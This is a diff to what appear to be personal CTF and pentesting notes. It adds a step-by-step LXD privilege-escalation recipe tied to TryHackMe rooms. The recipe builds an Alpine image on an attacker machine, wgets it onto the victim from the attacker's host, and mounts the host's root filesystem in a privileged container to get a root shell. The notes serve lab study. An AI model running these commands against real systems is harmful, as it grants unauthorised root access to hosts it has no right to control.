@@ -91,13 +91,49 @@ pacman -Qe # arch linux
 ss -ltp
 ```
 
-##
+
+
+### LXD&#x20;
+
+Followed this link on lxd privilege escalation. Did this on [anonymous.md](../../../../walkthroughs/tryhackme/anonymous.md "mention") and [gamingserver.md](../../../../walkthroughs/tryhackme/gamingserver.md "mention")
+
+**Link:** [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
+
+**Victim**
 
 ```
-getcap -r / 2>/dev/null
+id
 ```
 
-##
+<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+python2 -m SimpleHTTPServer 81
+```
+
+**Note:** The command lxd init was to resolve a storage pool area issue, it may not always be needed.
+
+**Victim**
+
+```
+cd /tmp
+wget http://$KALI/alpine-v3.18-x86_64-20231111_1929.tar.gz
+lxc image import ./alpine-v3.18-x86_64-20231111_1929.tar.gz --alias myimage
+lxd init
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+```
+
+
 
 ## PSPY
 
